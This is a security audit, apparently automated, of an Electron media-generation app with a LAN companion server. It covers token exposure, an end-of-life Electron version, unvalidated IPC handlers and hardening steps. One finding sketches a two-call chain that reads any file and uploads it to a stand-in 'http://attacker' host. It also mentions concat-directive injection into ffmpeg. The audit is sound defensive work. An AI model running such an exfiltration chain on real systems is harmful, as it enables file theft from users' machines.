# Security Audit — MINIMAX-DESKTOP (Cobdog fork)

> Automated adversarial security review, 2026-09-09, at `18fe989`. Read-only pass over `electron/main.ts`, `electron/preload.ts`, `src/`, `public/sw.js`, `package.json`. Findings verified against code; line references from the surveyed commit.

### Threat model summary

The attack surfaces that matter here are: (1) **LAN peers** — the mobile companion server binds `0.0.0.0:4178` at every app launch, speaking plaintext HTTP with a single bearer token, so anyone on the same Wi-Fi can probe it and, if they obtain the token (sniffing, shoulder-surfing the QR, or the phone's localStorage), gains persistent control of generation, media, and the Ollama proxy; (2) **a malicious or compromised ComfyUI** — its history/object_info/WebSocket responses flow into the renderer and main process and are used as filenames, URLs, and mime types; (3) **crafted media bytes** — ComfyUI-sourced video is fed to ffmpeg and written into the temp directory; (4) **renderer compromise amplification** — the preload exposes ~30 unvalidated fs/URL/process IPC primitives, so any future renderer bug becomes arbitrary file read/exfiltration despite contextIsolation. Local-machine attackers and swapped model files on disk are out of scope (local write = game over regardless).

No Critical findings. The two High findings are the LAN transport and the EOL Electron runtime.

---

## Findings

### [HIGH] LAN companion: plaintext HTTP on all interfaces with a bearer token passed in the URL
- **Location:** `electron/main.ts:467-469` (`listen(port, '0.0.0.0')`, token embedded in share URLs), `main.ts:362` (token accepted from `x-minimax-token` header **or** `?token=` query), `src/MobileApp.tsx:33-35` (token persisted to phone localStorage), `MobileApp.tsx:244,262` (token in EventSource and media URLs).
- **Description:** The companion server has no TLS. The 128-bit token travels in cleartext query strings and headers on every request, is displayed in a QR code, and is stored indefinitely in the phone browser's localStorage. The server binds to every interface (Wi-Fi, Ethernet, VPN, virtual adapters) — the `lanAddress()` scoring (`main.ts:261-271`) only picks which address goes into the QR, not what's reachable.
- **Impact / attack scenario:** On any untrusted network the laptop joins (café, conference, shared office Wi-Fi), a passive sniffer captures the token once during a phone session and keeps it forever (rotation is manual and opt-in). The token grants, without expiry: submitting **arbitrary ComfyUI workflow JSON** (`/api/lan/prompt`, `main.ts:406-412` — any installed custom node becomes reachable, which is code-execution-adjacent on the desktop), reading all generated media (`/api/lan/history` + `/api/lan/media`), uploading files into ComfyUI's input tree, driving Ollama (`main.ts:414-423`), and `/api/lan/bootstrap` recon (`main.ts:365-381`) that discloses **full filesystem paths of every model file**, ComfyUI node inventory, and Ollama model list.
- **Recommendation:** (a) Start the server on demand when the sharing panel opens, not in `whenReady`; (b) accept the token from the header only for fetch-based routes (keep the query param solely for the one EventSource connection, or move to a short-lived ticket); (c) compare with `crypto.timingSafeEqual` on fixed-length buffers instead of `!==` (`main.ts:363`); (d) generate a self-signed cert at first run, embed its fingerprint in the QR alongside the URL, and serve HTTPS — the PWA path already requires a secure context for install (`MobileApp.tsx:143,345`), so this unlocks that too; (e) trim what bootstrap leaks (strip `path` down to filename).

### [HIGH] Electron 34 is end-of-life — no security patches since June 2025
- **Location:** `package.json:40` (`"electron": "^34.0.0"`), `pnpm-lock.yaml` (resolves to `electron@34.5.8`).
- **Description:** Electron 34 (Chromium 132) reached end of support on **2025-06-24**; it is now ~15 months without Chromium/Electron security backports. 34.5.8 does contain the last backported fixes shipped for that line, but nothing after EOL.
- **Impact:** Any renderer-level Chromium exploit published after June 2025 is unpatched. Because the renderer loads no remote web content today, exploitability is currently low — but this app's whole containment story rests on the renderer sandbox, so an unpatched renderer engine directly undermines the IPC-surface finding below.
- **Recommendation:** Upgrade to the current supported Electron major (a minor-version bump within 34 buys nothing). The app uses a small, stable API set (`BrowserWindow`, `protocol.handle`, `ipcMain.handle`, `net.fetch`), so the jump should be mechanical.

### [MEDIUM] LAN server starts unconditionally at every launch, bound to all interfaces
- **Location:** `electron/main.ts:536-537` (`app.whenReady().then(async () => { await startLanServer() ... })`), `main.ts:460-473`.
- **Description:** The HTTP server is listening before the user has expressed any intent to share, on `0.0.0.0`. Only the token gates access; the token is generated on first launch and persisted (`main.ts:169-177`).
- **Impact:** Every LAN/VPN peer can reach the server, fingerprint it, hammer `/api/lan/*` (no rate limiting), and probe token guesses against a non-constant-time comparison. Brute-forcing 128 bits is infeasible, so this is exposure-without-current-breach — but it widens the blast radius of the High finding above (Windows Firewall will already have opened an inbound rule on first run).
- **Recommendation:** Defer `startLanServer()` until the user opens the LAN dialog (the `lan:status` handler can lazily start it), and stop it on dialog close or app idle. Consider binding to the single `lanAddress()`-selected interface instead of `0.0.0.0`.

### [MEDIUM] IPC surface gives the renderer unvalidated filesystem, URL, and process primitives
- **Location:** `electron/main.ts` — all 30 channels enumerated in `docs/inventory.md` §1.2. Specific unchecked ones:
  - `file:data-url` (`main.ts:729-733`): reads **any path** the renderer names and base64s it — the mime fallback maps *unknown extensions to `image/jpeg`*, so there is no extension restriction at all.
  - `comfy:upload` (`main.ts:681-689`): reads **any renderer-named path** and POSTs the bytes to a **renderer-supplied URL** — a one-call arbitrary-file exfiltration primitive.
  - `comfy:*` handlers (`main.ts:602-676`): fetch renderer-supplied URLs from main with no origin check (contrast the `minimax-media://comfy` handler, which does pin origin+pathname at `main.ts:543-546`).
  - `video:frame/frames/trim/join` (`main.ts:738-808`): write into a renderer-supplied `outputDirectory` with no validation — note `comfy:save-output-image` **does** validate it against settings (`main.ts:638-639`), so the pattern exists and just isn't applied here. Also `video:join` interpolates `clip.start`/`clip.end` into the ffmpeg concat list without the numeric validation `video:trim` has (`main.ts:777` vs `main.ts:800-803`), allowing concat-directive injection from a crafted clip array.
  - `settings:save` → `ffmpegPath` later spawned by `runFfmpeg` (`main.ts:475-486`).
- **Description:** `contextIsolation: true` / `nodeIntegration: false` correctly keep Node out of the renderer, but the preload (`electron/preload.ts`) forwards renderer arguments straight into privileged operations. The security model degenerates to "the renderer is fully trusted" — which is exactly what isolation is supposed to avoid.
- **Attack scenario:** Requires a renderer bug first (none found today — React-only rendering, zero `dangerouslySetInnerHTML`/`innerHTML`/`eval` in `src/`). But given one — e.g., a future markdown-rendering change to Ollama output — the chain `file:data-url("C:\Users\...")` → read → `comfy:upload("http://attacker", path)` exfiltrates any file off the machine in two IPC calls, no Chromium sandbox escape needed.
- **Recommendation:** Validate in main, not in the renderer: (a) restrict `file:data-url`, `file:media-url`, `comfy:upload` to paths returned by `dialog:media`/`dialog:directory` in this session (keep an allowlist in main); (b) require all `comfy:*`/`ollama:*` `url` arguments to match the origin saved in settings; (c) apply the existing `comfy:save-output-image` outputDirectory check to all `video:*` handlers; (d) validate `clip.start/end` as finite numbers like `video:trim` does.

### [MEDIUM] `minimax-media://selected` allows the renderer to stream any media file on disk
- **Location:** `electron/main.ts:558-560` (`hostname === 'selected'` branch — only checks `existsSync` + extension), fed by `file:media-url` (`main.ts:734-737`).
- **Description:** Unlike the `local` hostname branch (which confines reads to the configured output directory via a prefix check at `main.ts:562-565`), the `selected` branch accepts any absolute path with a media/image/audio extension anywhere on the filesystem.
- **Impact:** Same renderer-compromise prerequisite as above: silent read of any `.png/.jpg/.mp4/.wav` on any drive. Extension restriction limits it to media types, so impact is bounded but real.
- **Recommendation:** Fold `selected` into the same allowlist approach — a path is "selected" only if main remembers handing it out from a native dialog.

### [LOW] No Content-Security-Policy anywhere
- **Location:** `index.html` (no meta CSP), `electron/main.ts` (no `session.defaultSession.webRequest.onHeadersReceived`).
- **Description:** The app relies entirely on React escaping. That currently holds, but there is no second layer for a renderer that renders ComfyUI node names, filenames, and Ollama prose.
- **Recommendation:** Add a strict CSP via `webRequest.onHeadersReceived` for the app origin, e.g. `default-src 'self'; img-src 'self' data: blob: minimax-media:; media-src 'self' blob: minimax-media:; script-src 'self'; style-src 'self'; connect-src 'self' minimax-media: http://127.0.0.1:* ws://127.0.0.1:*`.

### [LOW] No navigation or window-open interception
- **Location:** `electron/main.ts` — no `setWindowOpenHandler`, no `will-navigate`, no `web-contents-created` hook (verified by grep).
- **Description:** Default Electron behavior allows the window to navigate anywhere and `window.open` to spawn new Electron windows. All current `target="_blank"` sinks are `minimax-media://` URLs, so no remote-content navigation is reachable **today**. Defense-in-depth for future links.
- **Recommendation:** In `createWindow`: `setWindowOpenHandler(() => ({ action: 'deny' }))` and a `will-navigate` guard allowing only the dev server, `file:`, and `minimax-media:`.

### [LOW] Token hygiene details
- **Location:** `electron/main.ts:362-363` (non-constant-time `!==` comparison), `main.ts:160-177` (plaintext token file in `userData`, no restrictive mode), `src/MobileApp.tsx:33-35` (token persisted to localStorage, never expires client-side).
- **Recommendation:** `timingSafeEqual` for comparison; write the token file with mode `0600`; have the mobile client drop its stored token on explicit disconnect.

### [LOW] LAN error reflection and request-size posture
- **Location:** `electron/main.ts:455-457` (catch-all returns `error.message` to any peer), `main.ts:313-323, 394` (JSON bodies fully memory-resident; upload-media allows 180 MB).
- **Recommendation:** Log the detail, return a generic 500 to unauthenticated paths.

### [INFO] Subfolder passthrough relies on ComfyUI's own path validation
- **Location:** `electron/main.ts:341-356` (validates `filename` against `/` and `\` — good — but forwards `subfolder`/`type` verbatim), `main.ts:628-635`.
- **Recommendation:** Reject `subfolder` values containing `..`, `/`, `\`, or absolute prefixes at the proxy boundary; one line.

### [INFO] Windows-only path separators make traversal guards fail-closed (and break) on POSIX
- **Location:** `electron/main.ts:448`, `main.ts:564` — both prefix checks use `\\`.
- **Description:** On Linux/macOS both checks always evaluate false: the static server serves only the SPA fallback and `minimax-media://local` always 403s. Fail-closed, so no vulnerability — but the companion is functionally Windows-only.
- **Recommendation:** Use `path.sep` and `path.relative`-based containment instead.

### [INFO] ffmpeg parses untrusted bytes
- **Location:** `electron/main.ts:499-510` (downloads ComfyUI `/view` bytes to temp, feeds ffmpeg), `main.ts:488-497` (user-configured `ffmpegPath`).
- **Recommendation:** Keep ffmpeg current from a pinned path; the `resolveVideoSource` origin pinning is already correct.

### [INFO] Dependencies and packaging
- **Description:** Runtime deps minimal and sane; `ws` past its 2024 DoS fix; no typosquats; NSIS config standard; secrets hygiene clean (nothing secret-shaped tracked; full `git log --all -p` scan found no key/password patterns).

---

## What's done RIGHT

- **Electron baseline is genuinely good:** `contextIsolation: true`, `nodeIntegration: false`; sandbox not disabled; `webSecurity` untouched; no webviews.
- **Privileged scheme with origin pinning:** `minimax-media://comfy` verifies both origin and pathname `=== '/view'` against the configured ComfyUI server before fetching (`main.ts:543-546`) — a correct SSRF guard.
- **Token design:** CSPRNG 128-bit, persisted, with a real rotation flow including confirmation (`main.ts:572-580`, `App.tsx:1487`).
- **Renderer hygiene:** pure React rendering — zero `innerHTML`/`dangerouslySetInnerHTML`/`eval` in `src/`; live-preview path whitelists mimes before creating blobs (`src/lib/useLivePreview.ts:68`).
- **Careful media handling:** robust Range parsing with 416 responses and safe-integer checks (`main.ts:97-111`); filename traversal checks in the LAN proxy; `basename()` on download dispositions; `comfy:save-output-image` validates the output directory against settings.
- **Service worker skips caching `/api/` and token-bearing URLs** (`public/sw.js:14-16`); static responses send `referrer-policy: no-referrer` + `x-content-type-options: nosniff`.
- **Request size caps on every LAN JSON route.**
- **File selection via native dialogs** rather than free-text paths; `lanAddress()` downranks VPN/virtual adapters.

## Top 5 hardening actions, in priority order

1. **Fix the LAN transport story:** on-demand server start; header-only token for fetch routes; `timingSafeEqual`; HTTPS with first-run self-signed cert + fingerprint in QR. Collapses the top High finding and most token-hygiene Lows at once.
2. **Upgrade Electron off the EOL 34 line** to the current supported major — the renderer sandbox is this app's load-bearing wall and it is unpatched.
3. **Add main-side validation to the IPC surface:** session allowlists for dialog-derived paths, origin pinning for all `comfy:*`/`ollama:*` URL arguments, settings-equality checks for `video:*` output directories, numeric validation for `video:join` clip points.
4. **Add CSP plus `setWindowOpenHandler`/`will-navigate` guards** so a future renderer regression stays contained.
5. **Validate `subfolder` at the proxy boundary; document the ComfyUI trust assumption; strip full model paths from `/api/lan/bootstrap`.**
